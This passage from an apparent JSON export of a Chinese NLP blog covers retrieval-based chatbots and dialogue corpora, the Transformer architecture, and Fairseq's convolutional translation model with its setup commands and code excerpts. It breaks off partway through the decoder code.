基于检索技术的模型较为简单，主要是根据用户的输入和上下文内容，使用了知识库（存储了事先定义好的回复内容）和一些启发式方法来得到一个合适的回复。启发式方法简单的有基于规则的表达式匹配，复杂的有一些机器学习里的分类器。这些系统不能够生成任何新的内容，只是从一个固定的数据集中找到合适的内容作为回复。 ​ 对于基于检索技术的模型，回复的内容语法上较为通顺，较少出现语法错误， 不能结合上下文给出回复。 ​ 生成式模型典型的有基于机器翻译模型的，与传统机器翻译模型不同的是，生成式模型的任务不是将一句话翻译成其他语言的一句话，而是输出一个回答(response)。 ​ 短对话 VS 长对话 ​ 处理长对话内容将更加困难，这是因为你需要在当前对话的情境下知道之前的对话说过什么。 开放域 VS 特定领域 ​ 面向开放域的聊天机器人技术面临更多困难，这是因为会话可能涉及的面太广，没有一个清晰的目标和意图。 ​ 面向特定领域的相关技术则相对简单一些，这是因为特定领域给会话的主题进行了限制，目标和意图也更加清晰，典型的例子有客服系统助手和购物助手。 面临的挑战 如何结合上下文信息 ​ 聊天机器人系统通常需要利用一些上下文信息(Context)，这里的上下文信息包括了对话过程中的语言上下文信息和用户的身份信息等。在长对话中人们关注的是之前说了什么内容以及产生了什么内容的交换，这是语言上下文信息的典型。 语义一致性 ​ 机器人面对相同语义而不同形式的问题应该给予一致的回复，例如这两个问题[How old are you?]和[What’s your age?]，很有可能不是一个个体。最大的原因在于训练模型的数据来源于大量不同的用户，这导致机器人失去了固定统一的人格。 对话模型的评测 ​ 在开放域中的对话系统没有一个清晰的优化目标。用于机器翻译的评测指标BLEU不能适用于此，是因为它的计算基础是语言表面上的匹配程度，而对话中的回答可以是完全不同词型但语义通顺的语句。 意图和回复多样性 ​ 生成式模型中的一个普遍问题是，它们可能生成一些通用的回答，例如[That’s great!]和[I don’t know]这样的可以应付许多的用户询问。 ​ 另外，人们在对话过程中的回复与询问有一定特定关系，是有一定意图的，而许多面向开放域的机器人不具备特定的意图。 ​ 目前深度学习的价值主要体现在能够获取大量数据的特定领域。目前一个无法做的事情是产生一个有意义的对话。 公开语料 dgk_shooter_min.conv.zip 中文电影对白语料，噪音比较大，许多对白问答关系没有对应好 The NUS SMS Corpus 包含中文和英文短信息语料，据说是世界最大公开的短消息语料 ChatterBot中文基本聊天语料 ChatterBot聊天引擎提供的一点基本中文聊天语料，量很少，但质量比较高 Datasets for Natural Language Processing 这是他人收集的自然语言处理相关数据集，主要包含Question Answering，Dialogue Systems， Goal-Oriented Dialogue Systems三部分，都是英文文本。可以使用机器翻译为中文，供中文对话使用 小黄鸡 据传这就是小黄鸡的语料：xiaohuangji50w_fenciA.conv.zip （已分词） 和 xiaohuangji50w_nofenci.conv.zip （未分词） 白鹭时代中文问答语料 由白鹭时代官方论坛问答板块10,000+ 问题中，选择被标注了“最佳答案”的纪录汇总而成。人工review raw data，给每一个问题，一个可以接受的答案。目前，语料库只包含2907个问答。(备份) Chat corpus repository chat corpus collection from various open sources 包括：开放字幕、英文电影字幕、中文歌词、英文推文 保险行业QA语料库 通过翻译 insuranceQA产生的数据集。train_data含有问题12,889条，数据 141779条，正例：负例 = 1:10； test_data含有问题2,000条，数据 22000条，正例：负例 = 1:10；valid_data含有问题2,000条，数据 22000条，正例：负例 = 1:10 基于内容检索式的聊天机器人 image ​ 检索式模型的输入是一段上下文内容 C (会话到目前未知的内容信息) 和一个可能作为回复的候选答案；模型的输出是对这个候选答案的打分。寻找最合适的回复内容的过程是：先对一堆候选答案进行打分及排序，最后选出分值最高的那个最为回复。 ​ Retrieval-Based Conversational Model in Tensorflow：https://github.com/dennybritz/chatbot-retrieval/ ​ 数据可以在Google Drive文件夹中找到：https://drive.google.com/open?id=1RIIbsS-vxR7Dlo2_v6FWHDFE7q1XPPgj ​ 数据文件需要: 123456- glove.6B.50d.txt (Subfolder GloVe)- training_10000.csv (Subfolder MAIN FILES)- validation_1000.csv (Subfolder MAIN FILES)- testing_same_structure_1000.csv (Subfolder MAIN FILES)- testing_different_structure_100.csv (Subfolder MAIN FILES)- saved_model_10000_gpu.pt (Subfolder SAVED MODELS) ​ 数据集为Ubuntu对话数据集。chatbot-retrieval/notebooks/Data Exploration.ipynb文件为数据分析。 Ubuntu对话数据集 训练集 ​ 训练数据有1,000,000条实例，其中一半是正例（label为1），一半是负例（label为0，负例为随机生成）。 ​ 每条实例包括一段上下文信息（context），即Query；和一段可能的回复内容，即Response；Label为1表示该Response确实是Query的回复，Label为0则表示不是。 ​ 数据集的生成使用了NLTK工具，包括分词、stemmed、lemmatized等文本预处理步骤；同时还使用了NER技术，将文本中的实体，如姓名、地点、组织、URL等替换成特殊字符。这些文本预处理并不是必须的，但是能够提升一些模型的性能。 ​ query的平均长度为86个word，而response的平均长度为17个word。 测试集和验证集 ​ 与训练集不同，在测试集和验证集中，对于每一条实例，有一个正例和九个负例数据（也称为干扰数据）。模型的目标在于给正例的得分尽可能的高，而给负例的得分尽可能的低。 ​ 负例生成方法可以参考谷歌的Smart Reply则使用了聚类技术，将每个类的中取一些作为负例，这样生成负例的方式显得更加合理（考虑了负例数据的多样性，同时减少时间开销）。 评测 ​ 模型的评测recall@k，即经模型对候选的response排序后，前k个候选中存在正例数据（正确的那个）的占比；显然k值越大，该指标会越高。 Dual Encoder LSTM Network 大致的流程如下： Query和Response都是经过分词的，分词后每个词embedded为向量形式。初始的词向量使用GloVe vectors，之后词向量随着模型的训练会进行fine-tuned（实验发现，初始的词向量使用GloVe并没有在性能上带来显著的提升）。 Query和Response经过相同的RNN（word by word）。RNN最终生成一个向量表示，捕捉了Query和Response之间的[语义联系]（图中的c和r）；这个向量的维度是可以指定的，这里指定为256维。 将向量c与一个矩阵M相乘，来预测一个可能的回复r’。如果c为一个256维的向量，M维256*256的矩阵，两者相乘的结果为另一个256维的向量，相当于一个生成式的回复向量。矩阵M是需要训练的参数。 通过点乘的方式来预测生成的回复r’和候选的回复r之间的相似程度，点乘结果越大表示候选回复作为回复的可信度越高；之后通过sigmoid函数，转成概率形式。图中把第(3)步和第(4)步结合在一起了。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"retireval","slug":"retireval","permalink":"https://racleray.github.io/tags/retireval/"}]},{"title":"Transformer Model","slug":"Transformer-Model","date":"2020-07-07T09:30:12.000Z","updated":"2023-08-07T11:54:31.035Z","comments":true,"path":"posts/7c7eb002.html","link":"","permalink":"https://racleray.github.io/posts/7c7eb002.html","excerpt":"Transformer 中两个任意输入的信号关联的开销会减少到一个固定的运算量级，使用 Multi-Head Attention 注意力机制可以高效地并行化，并堆叠多层的神经网络。","text":"1.Transformer模型 ​ 序列计算中，传统的RNN在预测下一个符号（token）的时候，会对以往的历史信息有很强的依赖，使得难以充分地并行化，也无法很好地加深网络的层级结构。 ​ 而对于传统的基于CNN的神经机器翻译模型，两个任意输入与输出位置的信号关联所需要的运算数量与它们的位置距离成正比，Facebook提出的CNN NMT 为线性增长。 ​ 这两种常见的结构使得学习较远位置的依赖关系（long-term dependency）非常困难。 ​ 在 Transformer 中，两个任意输入的信号关联的开销会减少到一个固定的运算数量级，使用 Multi-Head Attention 注意力机制可以完全脱离RNN及CNN的结构，使得Transformer可以高效地并行化，并堆叠多层的网络。 ​ 自注意力（Self-attention），是一种涉及单序列不同位置的注意力机制，并能计算序列的表征。自注意力这种在序列内部执行 Attention 的方法可以视为搜索序列内部的隐藏关系，这种内部关系对于翻译以及序列任务的性能非常重要。 1.1 编码器 encoder 编码器encoder由6层结构一样的网络层组成，每一层有2个子层： 第一个子层是multi-head self-attention Layer 第二个子层是一个基于位置编码的全连接网络层（position-wise fully connected feed-forward network） 会使用残差连接的方式，分别对每个子层的输入加到这个子层的输出上，然后再接一个Layer normalization的归一化层。 ​ \\[ \\text{LayerNorm}(x+\\text{Sublayer}(x)) \\] 所有的embedding及hidden state的维度都是512 1.2 解码器 decoder 解码器decoder由6层结构一样的网络层组成，每一层除了跟encode人一样有2个子层以外，还有第3个子层 第一个子层是multi-head self-attention Layer 第二个子层是一个基于位置编码的全连接网络层（position-wise fully connected feed-forward network） 第三个子层用于对encoder的输出向量进行multi-head attention 同样的，会使用残差连接的方式，然后再接一个Layer normalization的归一化层。 \\[ \\text{LayerNorm}(x+\\text{Sublayer}(x))\\\\ \\] decoder还需要将还没有生成的后续序列掩盖（masking），这样做是为了防止decoder在做self-attention的时候关注到后续还未生成的单词上去。 1.3 注意力机制 传统的注意力机制，也称为scaled Dot-Product Attention，可以看成是有一个询问的词（query），去跟一堆哈希表中的键值对（key-value pair）进行匹配，找到最相关的键（key），之后返回该键所对应的值（value）。通常的，如果只返回一个key所对应的value，称之为hard attention。如果对所有的key都计算一个相关系数，（也称之为attention weight），可以将所有key对应的value进行加权求和（weighted sum）这样的操作称之为soft attention。 \\[\\text{Attention}(Q,K,V) = \\text{softmax}\\left({QK^T \\over \\sqrt{d_k}}\\right)V\\] 其中所有的query和key都是维度为\\(d_k\\)的向量，将这些向量分别叠在一起形成 \\(Q\\in\\mathbb{R}^{|Q|\\times d_k}, K\\in\\mathbb{R}^{|K|\\times d_k}\\)的矩阵。 所有的value都是维度为\\(d_v\\)的向量，将这些向量叠在一起形成\\(V\\in\\mathbb{R}^{|V|\\times d_k}\\) 这里如果维度\\(d_k\\)很大的时候，两个向量的乘积会变得很大，使得softmax会得到非常小的数值，所以会在这里除以\\(\\sqrt{d_k}\\)来抵消这个影响。 1.4 Multi-Head Attention 这里假设\\(Q,~K,~V\\in \\mathbb{R}^{d_\\text{model}}\\)都在一个\\({d_\\text{model}}\\)维度的空间中 使用h个不一样权重的线性映射函数\\((QW^Q_i, KW^K_i, VW^V_i)\\)将Q, K, V分别映射到\\(d_k,~d_k,~d_v\\)空间中 对映射之后的Q, K, V 做h次attention，并将h个attention head连接在一起形成一个新的向量 最后再将这个向量映射到\\(d_\\text{model}\\)空间，作为下一层的输入 ​ \\[ \\text{MultiHead}(Q,K,V) = \\text{Concat}(\\text{head}_1,\\cdots, \\text{head}_h) W^O \\\\ \\text{head}_i = \\text{Attention}(QW^Q_i, KW^K_i, VW^V_i) \\] 其中\\(W^Q_i\\in \\mathbb{R}^{d_\\text{model}\\times d_k}, W^K_i\\in \\mathbb{R}^{d_\\text{model}\\times d_k}, W^V_i\\in \\mathbb{R}^{d_\\text{model}\\times d_v}, W^O\\in \\mathbb{R}^{hd_v\\times d_\\text{model}}\\), 常见的设置\\(h=8,d_k=d_v=d_\\text{model}/h=64\\) 模型图 应用 将decoder上一个时刻的hidden state 作为query，将encoder的最顶层的所有输出的hidden state作为key和value，这样可以类似传统的attention机制一样去发现源语言单词与目标语言单词之间的联系 encoder本身会对源语言单词进行multi-head self attention，其中query，key，value都是一样的，都是上一层中输出的单词的hidden state，每一个时刻计算出来的context vector都会作为该层输出的新的单词的hidden state，并作为下一层的输入。 decoder本身也会类似encoder一样去做self attention，不同的是，decoder只对左边已经生成的序列进行attention，对还没有生成的（右边的）序列掩盖（masking） 完整的模型图 1.5 基于位置的前向神经网络（Position-wise Feed-Forward Networks） 对于encoder和decoder的每个attention层之后，还会在连接一个全连接的前向神经网络。这个网络包含了两个线性转换和中间加一个ReLU的激活函数 \\[FFN(x) =\\max(0, xW_1+b_1) W_2+b_2\\] 这里每一层，都用不同的\\(W_1,W_2,b_1,b_2\\)。 1.6 词向量矩阵及Softmax层 这里使用常见的词向量矩阵，并encoder会把词向量映射到\\(d_\\text{model}\\)空间上，作为第一层的输入 在做预测的时候，会将输出向量映射到一个词表大小的概率空间中，并使用softmax来归一化到一个\\([0,1]\\)之间的概率值。 1.7 位置编码（position embeddings） 因为模型没有recurrence及convolution的操作，所以为了让模型能够分辨不同位置的单词，需要对单词的位置进行编码。 ​ \\[PE(pos, 2i)=\\sin(pos/10000^{2i/d_\\text{model}}) \\\\ PE(pos, 2i+1)=\\cos(pos/10000^{2i/d_\\text{model}})\\] pos是这个单词在句子中的位置，i是这个位置向量的第i个维度的编号。这样的波长形成了一个从\\(2\\pi\\)到\\(1000\\cdot 2\\pi\\)的几何级数。这样会使得模型更容易学到相对距离，因为\\(PE_{pos+k}\\)可以表示为\\(PE_{pos}\\)的一个线性变化。 1.8 Transformer 对比RNN及CNN 发现RNN需要进行\\(O(n)\\)个序列操作，而Transformer和CNN只需要\\(O(1)\\)个 CNN会形成一个层级结构，类似树状，所以任意两个单词到达的最大路径长度是\\(O(\\log_k(n))\\) 如果self-attention只对该单词周围r个单词进行attention操作，可以得到restricted版本的self-attention， 这样可以减少每一层的计算复杂度，但未增加两个任意词之间到达的最长路径。 2. Transformer模型的训练细节 优化方法 正则化 （regularization） label smoothing 2.1 优化方法 Adam 优化方法，\\(\\beta_1=0.9, \\beta_2=0.98, \\epsilon=10^{-9}\\) learning rate是随着训练的过程中，通过以下一个函数进行变化。一开始在前 warmup_steps个训练迭代中learning rate是线性增长的，往后随着步长的增加而下降。 一般会设置 warmup_steps = 4000 \\[lr = d_\\text{model}^{-0.5} \\cdot \\min(\\text{step_num}^{-0.5},\\text{step_num}\\cdot \\text{warmup_steps}^{-1.5}) \\] 2.2 正则化 Regularization 对每一个子层的输出，在该子层的输出加上该子层的输入之前进行dropout 对encoder及decoder，词向量和位置向量求和之后都进行dropout 2.3 Label Smoothing 对于正确的标注label，在其one-hot表达上，加上一个均匀分布的向量，这个smoothing的数值是\\(\\epsilon_{ls}=0.1\\) 3 Tranformer Code TensorFlow transformer 官方代码 作者代码 哈佛NLP组pytorch实现","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"transformer","slug":"transformer","permalink":"https://racleray.github.io/tags/transformer/"}]},{"title":"Fairseq Notes","slug":"Fairseq-Notes","date":"2020-07-07T09:01:06.000Z","updated":"2023-08-07T11:54:31.029Z","comments":true,"path":"posts/62a02478.html","link":"","permalink":"https://racleray.github.io/posts/62a02478.html","excerpt":"在自然语言处理中，大部分流行的seq2seq模型都是基于RNN结构去构建encoder和decoder，使得并行化操作难以充分进行，难以发挥完全发挥GPU并行的效率。而Fairseq是一种以CNN为基础的模型。","text":"1.基于CNN的翻译系统模型结构 ​ 在自然语言处理中，大部分流行的seq2seq模型都是基于RNN结构去构建encoder和decoder，但是RNN对于下一个状态的预测需要依赖前面的所有历史状态，使得并行化操作难以充分进行，难以发挥完全发挥GPU并行的效率。相反CNN通过在固定窗口内的计算，使得计算的并行化变得更加简单，而且通过多层CNN网络可以构建层级结构(hierarchical structure)，可以达到利用更短的路径去覆盖更长范围内的信息。 ​ Facebook提出了基于CNN的机器翻译模型，并开源了CNN的机器翻译工具Fairseq 1.1 Pooling Encoder ​ 最简单的non-recurrent encoder就是把k个连续的单词的词向量求平均值，通过在句子左右两边都添加额外的空单词(paddings)，可以使得encoder输出跟原来句子同等长度的hidden embeddings。 假设原来的句子的词向量（word embedding）表示为 \\(w=[w_1,\\cdots,w_m],~\\forall~w_j\\in R^f\\) absolute position embeddings用于编码位置信息 \\(p=[p_1,\\cdots,p_m],~\\forall~p_j\\in R^f\\) \\[e_j = w_j + p_j,~~ z_j = {1\\over k} \\sum_{t=-k/2}^{k/2}e_{j+t} \\] 传统的attention机制 \\[ c_i = \\sum_{j=1}^m a_{ij} e_j\\] 1.2 卷积编码器Convolutional Encoder NMT ​ 卷积编码器在pooling encoder的基础上进行改进，使用一个CNN-a 卷积层来进一步编码源语言句子中的词。输出原句长度的第一层卷积结果Z。 ​ \\[z_j = CNN\\_a(e)_j \\] ​ 注意attention的时候，使用了另一个CNN-c卷积层来编码源语言句子中的单词，还是输出原句长度的第一层卷积结果，作为计算atttention weight的encoder hidden states。然后计算atttention weight，再进行加权求和。 ​ \\[c_i = \\sum_{j=1}^m a_{ij} CNN\\_c(e)_j\\] ​ 该模型的encoder 采用的是CNN，但其decoder还是采用了传统的RNN模型 1.３ 全卷积神经翻译模型 Convolutional NMT 该模型的encoder和decoder都采用的是卷积核CNN，动图演示 卷积核结构 假设有1D的卷积核的窗口大小是k(比如k=5)，每个卷积核都可以用一个权重矩阵\\(W\\in \\mathbb{R}^{2d\\times kd}\\)和 bias \\(b_w\\in \\mathbb{R}^{2d}\\)。对于窗口内的词向量 \\(X\\in \\mathbb{R}^{k\\times d}\\)把所有单词拼接成一个长向量 \\(X&#39;\\in \\mathbb{R}^{kd}\\). \\[Y=WX&#39;+b_w = [A B] \\in \\mathbb{R}^{2d} \\\\ A,B\\in \\mathbb{R}^{d} \\] 接下来采用Gated Linear Unites(GLU)的方式来进行编码, \\(\\sigma()\\)是一个非线性的激活函数， \\(\\otimes\\)是element-wise mulitiplication \\[v([A B] = A \\otimes \\sigma(B) \\in \\mathbb{R}^d\\] 残差连接 Residual Connection: 把这一层的输入也累加到下一层的输出 \\[h_i^l = v(W^l [h_{(i-k)/2}^{l-1},\\cdots,h_{(i+k)/2}^{l-1}]+b_w^l)+h_i^{l-1} \\in \\mathbb{R}^d\\] 编码器 Encoder: 假设原来的句子的词向量（word embedding）表示为 \\(w=[w_1,\\cdots,w_m],~\\forall~w_j\\in \\mathbb{R}^f\\) absolute position embeddings用于编码位置信息 \\(p=[p_1,\\cdots,p_m],~\\forall~p_j\\in \\mathbb{R}^f\\) \\[e_j = w_j + p_j \\\\ \\] encoder 先用一个线性函数\\(f:\\mathbb{R}^f\\rightarrow \\mathbb{R}^d\\)，把词向量映射到d维空间中 接下来encoder会将词向量通过一层层卷积核，得到每一层的单词的隐式表达（hidden state）, 其中 \\(z_j^u\\) 代表的是第u层CNN中第j个单词的表达 Multi-step Attention机制 假设已经翻译的单词的词表达是 \\(g=[g_1,\\cdots, g_n]\\)，跟源语言的词表达一样，这里也是word embeddings加上positional embeddings 假设decoder的卷积核的hidden state \\(h_i^l\\), 可以进一步计算decoder已经生成的单词的每一层的单词表达 \\[d_i^l = W_d^l h_i^l + b_d^l + g_i \\] 假设encoder 最顶层(假设是第u层)中，每个单词的表达是\\(z_j^u\\)。可以计算decoder第l层中第i个已经生成的单词\\(h_i^l\\)与源语言句子中最顶层（也即是第u层）的第j个单词 \\(z_j^u\\)的权重: \\[a_{ij}^l = {\\exp(d_i^l \\cdot z_j^u) \\over \\sum_{t=1}^m \\exp(d_i^l \\cdot z_t^u) } \\] 可以进一步计算在decoder第l层，在第i个时刻的上下文向量（也即是context vector）如以下公式，其中将encoder最顶层(第u层)的词向量\\(z_j^u\\)与最底层的词向量\\(e_j\\)相加。 ​ \\[c_i^l = \\sum_{j=1}^m a_{ij}^l (z_j^u + e_j) \\] 将\\(c_i^l\\)加到\\(h_i^l\\)中，作为decoder 的下一层的输入 解码器 decoder 把decoder最顶层的hidden state \\(h_i^L\\) 通过一个线性的函数映射到词表空间上\\(d\\rightarrow |V|\\)，之后在通过一个softmax函数 归一化成一个条件概率向量： \\[p(y_{i+1}|y_1,\\cdots, y_i, x)= softmax(W_o h_i^L + b_0) \\in \\mathbb{R}^{|V|} \\] 模型的结构图 1.4 全卷积神经翻译模型对比RNN神经翻译模型 全卷积神经网络使用层级结构，可以充分地并行化 对于一个窗口大小为\\(k\\)的CNN，编码一个特征向量可以总结一个窗口为n个单词的信息，只需要做\\(O(n/k)\\)个卷积核操作。对比RNN，RNN编码一个窗口为n个单词的信息，需要做\\(O(n)\\)个操作，跟句子的长度成正比 对于一个CNN的输入，都进行了相同数量的卷积操作及非线性操作。对比RNN，第一个输入的单词进行了n词非线性操作，而最后一个输入的单词只进行了一次非线性操作。对于每个输入都进行相同数量的操作会有利于训练。 训练CNN NMT需要非常小心地设置参数及调整网络中某些层的缩放。 2 使用CNN完成神经机器翻译系统的tricks ​ 训练过程中，需要将网络中某些部分进行缩放(scaling)，需要对权重初始化，需要对超参数进行设置 2.1 缩放操作（scaling） 将残差层的输出乘以 \\(\\sqrt{0.5}\\)， 这样会减小一半的偏差variance 对于attention机制产生的上下文向量 \\(c_{ij}^l\\) 乘以一个系数 \\(m\\sqrt{1/m}\\), 其中m为源语言句子中单词个个数，这样做的好处也是能减小偏差。 对于CNN decoder有multiple atttention的情况，将encoder 每一层的gradient乘以一个系数，该系数是使用的attention的数量。注意，只对encoder中除了源语言单词的词向量矩阵以外的参数，放大gradient，源语言的词向量矩阵的gradient不进行放大。在实验中，这样的操作会使得训练能更加稳定。 2.2 参数初始化 所有的词向量矩阵从一个以０为中心，标准差为0.1的高斯分布中随机初始化 \\(\\mathcal{N}(0, \\sqrt{n_l})\\), 其中\\(n_l\\)为输入到这个神经元的输入个数，一般可以设置为0.1。这样能有助于保持一个正态分布的偏差。 还需要对每一层的激活函数输出进行正规化(normalization)， 比如残差连接中，每一层层的输出向量需要先做正则化，再把这一层的输入加到输出的向量上。 对于GLU，需要对其权重 \\(W\\)从一个正态分布\\(\\mathcal{N}(0, \\sqrt{4p\\over n_l})\\)中随机抽样，而其bias设置成０ 对每一层网络的输入向量都进行dropout处理 2.3 超参数设置 encoder 和decoder都是用512维的hidden units，512维的word embeddings 训练的时候使用Nesterov's accelerated gradient 的方法进行优化模型，momentum 设置成0.99 如果gradient的norm超过0.1就把gradient 重新归一化到0.1以内。 初始的learning rate设置成0.25，如果在每次进行valudation的时候dev数据集中的perplexity没有下降，就将learning rate乘以0.1, 一直持续到learning rate 降到\\(10^{-4}\\)以下停止训练 mini-batch的大小设置成每次处理64句双语句子 3. Facebook CNN 机器翻译系统代码解析 相应的代码可以在github上找到 fairseq 安装 1234git clone https://github.com/pytorch/fairseq.gitcd fairseqpip install -r requirements.txtpython setup.py build develop https://fairseq.readthedocs.io/en/latest/command_line_tools.html 3.1 Code 12345678910111213141516171819202122232425# 预处理数据$ bash prepare-wmt14en2de.sh --icml17$ cd examples/translation/$ bash prepare-wmt14en2de.sh$ cd ../..# 将数据处理成二进制形式，加速读写$ TEXT=examples/translation/wmt14_en_de$ python preprocess.py --source-lang en --target-lang de \\ --trainpref $TEXT/train --validpref $TEXT/valid --testpref $TEXT/test \\ --destdir data-bin/wmt14_en_de --thresholdtgt 0 --thresholdsrc 0# 训练模型# 如果显存不足，可以将--max-tokens设置成1500$ mkdir -p checkpoints/fconv_wmt_en_de$ python train.py data-bin/wmt14_en_de \\ --lr 0.5 --clip-norm 0.1 --dropout 0.2 --max-tokens 4000 \\ --criterion label_smoothed_cross_entropy --label-smoothing 0.1 \\ --lr-scheduler fixed --force-anneal 50 \\ --arch fconv_wmt_en_de --save-dir checkpoints/fconv_wmt_en_de# 测试，生成$ python generate.py data-bin/wmt14_en_de \\ --path checkpoints/fconv_wmt_en_de/checkpoint_best.pt --beam 5 --remove-bpe 3.2 使用预训练好的模型 123456789101112131415# 下载模型及测试数据$ mkdir -p data-bin$ curl https://dl.fbaipublicfiles.com/fairseq/models/wmt14.v2.en-fr.fconv-py.tar.bz2 | tar xvjf - -C data-bin$ curl https://dl.fbaipublicfiles.com/fairseq/data/wmt14.v2.en-fr.newstest2014.tar.bz2 | tar xvjf - -C data-bin# 进行翻译生成$ python generate.py data-bin/wmt14.en-fr.newstest2014 \\ --path data-bin/wmt14.en-fr.fconv-py/model.pt \\ --beam 5 --batch-size 128 --remove-bpe | tee /tmp/gen.out# 对翻译结果打分$ grep ^H /tmp/gen.out | cut -f3- &gt; /tmp/gen.out.sys$ grep ^T /tmp/gen.out | cut -f2- &gt; /tmp/gen.out.ref$ python score.py --sys /tmp/gen.out.sys --ref /tmp/gen.out.ref 3.3 Notes CNN NMT类 FConvModel 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152@register_model('fconv')class FConvModel(FairseqModel): \"\"\" Args: encoder (FConvEncoder): the encoder decoder (FConvDecoder): the decoder \"\"\" def __init__(self, encoder, decoder): ... @staticmethod def add_args(parser): parser.add_argument('--dropout', type=float, metavar='D', help='dropout probability') parser.add_argument('--encoder-embed-dim', type=int, metavar='N', help='encoder embedding dimension') parser.add_argument('--encoder-embed-path', type=str, metavar='STR', help='path to pre-trained encoder embedding') parser.add_argument('--encoder-layers', type=str, metavar='EXPR', help='encoder layers [(dim, kernel_size), ...]') parser.add_argument('--decoder-embed-dim', type=int, metavar='N', help='decoder embedding dimension') parser.add_argument('--decoder-embed-path', type=str, metavar='STR', help='path to pre-trained decoder embedding') parser.add_argument('--decoder-layers', type=str, metavar='EXPR', help='decoder layers [(dim, kernel_size), ...]') parser.add_argument('--decoder-out-embed-dim', type=int, metavar='N', help='decoder output embedding dimension') @classmethod def build_model(cls, args, task): base_architecture(args) ... encoder = FConvEncoder( dictionary=task.source_dictionary, embed_dim=args.encoder_embed_dim, embed_dict=encoder_embed_dict, convolutions=eval(args.encoder_layers), dropout=args.dropout, max_positions=args.max_source_positions, ) decoder = FConvDecoder( dictionary=task.target_dictionary, embed_dim=args.decoder_embed_dim, embed_dict=decoder_embed_dict, convolutions=eval(args.decoder_layers), out_embed_dim=args.decoder_out_embed_dim, attention=eval(args.decoder_attention), dropout=args.dropout, max_positions=args.max_target_positions, share_embed=args.share_input_output_embed, ) return FConvModel(encoder, decoder) CNN encoder类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110class FConvEncoder(FairseqEncoder): def __init__( self, dictionary, embed_dim=512, embed_dict=None, max_positions=1024, convolutions=((512, 3),) * 20, dropout=0.1, left_pad=True, ): ... # 定义词向量矩阵及位置矩阵 self.embed_tokens = Embedding(num_embeddings, embed_dim, self.padding_idx) self.embed_positions = PositionalEmbedding( max_positions, embed_dim, self.padding_idx, left_pad=self.left_pad, ) convolutions = extend_conv_spec(convolutions) in_channels = convolutions[0][0] self.fc1 = Linear(embed_dim, in_channels, dropout=dropout) self.projections = nn.ModuleList() self.convolutions = nn.ModuleList() self.residuals = [] # 定义CNN层及残差层 layer_in_channels = [in_channels] for _, (out_channels, kernel_size, residual) in enumerate(convolutions): if residual == 0: residual_dim = out_channels else: residual_dim = layer_in_channels[-residual] self.projections.append(Linear(residual_dim, out_channels) if residual_dim != out_channels else None) if kernel_size % 2 == 1: padding = kernel_size // 2 else: padding = 0 self.convolutions.append( ConvTBC(in_channels, out_channels * 2, kernel_size, dropout=dropout, padding=padding) ) self.residuals.append(residual) in_channels = out_channels layer_in_channels.append(out_channels) self.fc2 = Linear(in_channels, embed_dim) def forward(self, src_tokens, src_lengths): # 查找词向量及位置向量 x = self.embed_tokens(src_tokens) + self.embed_positions(src_tokens) x = F.dropout(x, p=self.dropout, training=self.training) input_embedding = x # 将词的表达映射到CNN的输入空间 fc1: R^f -&gt;R^d x = self.fc1(x) # 在句子左右两边添加padding encoder_padding_mask = src_tokens.eq(self.padding_idx).t() # -&gt; T x B if not encoder_padding_mask.any(): encoder_padding_mask = None # 转置：B x T x C -&gt; T x B x C x = x.transpose(0, 1) residuals = [x] # 多层的CNN 层叠起来 for proj, conv, res_layer in zip(self.projections, self.convolutions, self.residuals): if res_layer &gt; 0: residual = residuals[-res_layer] residual = residual if proj is None else proj(residual) else: residual = None if encoder_padding_mask is not None: x = x.masked_fill(encoder_padding_mask.unsqueeze(-1), 0) x = F.dropout(x, p=self.dropout, training=self.training) if conv.kernel_size[0] % 2 == 1: # padding is implicit in the conv x = conv(x) else: padding_l = (conv.kernel_size[0] - 1) // 2 padding_r = conv.kernel_size[0] // 2 x = F.pad(x, (0, 0, 0, 0, padding_l, padding_r)) x = conv(x) # GLU 层 x = F.glu(x, dim=2) # 残差层 if residual is not None: x = (x + residual) * math.sqrt(0.5) residuals.append(x) # T x B x C -&gt; B x T x C x = x.transpose(1, 0) # 将x映射回词向量空间 R^d -&gt; R^f x = self.fc2(x) if encoder_padding_mask is not None: encoder_padding_mask = encoder_padding_mask.t() # -&gt; B x T x = x.masked_fill(encoder_padding_mask.unsqueeze(-1), 0) # 将gradient放大 x = GradMultiply.apply(x, 1.0 / (2.0 * self.num_attention_layers)) # 把input embedding加到output中 y = (x + input_embedding) * math.sqrt(0.5) return &#123; 'encoder_out': (x, y), 'encoder_padding_mask': encoder_padding_mask, # B x T &#125; 解码器decoder 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111class FConvDecoder(FairseqIncrementalDecoder): def __init__(self,...): # 定义词向量矩阵及位置向量矩阵 self.embed_tokens = Embedding(num_embeddings, embed_dim, padding_idx) self.embed_positions = PositionalEmbedding( max_positions, embed_dim, padding_idx, left_pad=self.left_pad, ) if positional_embeddings else None convolutions = extend_conv_spec(convolutions) in_channels = convolutions[0][0] self.fc1 = Linear(embed_dim, in_channels, dropout=dropout) self.projections = nn.ModuleList() self.convolutions = nn.ModuleList() self.attention = nn.ModuleList() self.residuals = [] # 定义多层CNN layer_in_channels = [in_channels] for i, (out_channels, kernel_size, residual) in enumerate(convolutions): if residual == 0: residual_dim = out_channels else: residual_dim = layer_in_channels[-residual] self.projections.append(Linear(residual_dim, out_channels) if residual_dim != out_channels else None) self.convolutions.append( LinearizedConv1d(in_channels, out_channels * 2, kernel_size, padding=(kernel_size - 1), dropout=dropout) ) self.attention.append(AttentionLayer(out_channels, embed_dim) if attention[i] else None) self.residuals.append(residual) in_channels = out_channels layer_in_channels.append(out_channels) self.adaptive_softmax = None self.fc2 = self.fc3 = None def forward(self, prev_output_tokens, encoder_out_dict=None, incremental_state=None): ... # 获得位置向量 if self.embed_positions is not None: pos_embed = self.embed_positions(prev_output_tokens, incremental_state) else: pos_embed = 0 # 获得上一个生成的单词的词向量 x = self._embed_tokens(prev_output_tokens, incremental_state) # 将词向量加上位置向量作为当前时刻的输入 x += pos_embed x = F.dropout(x, 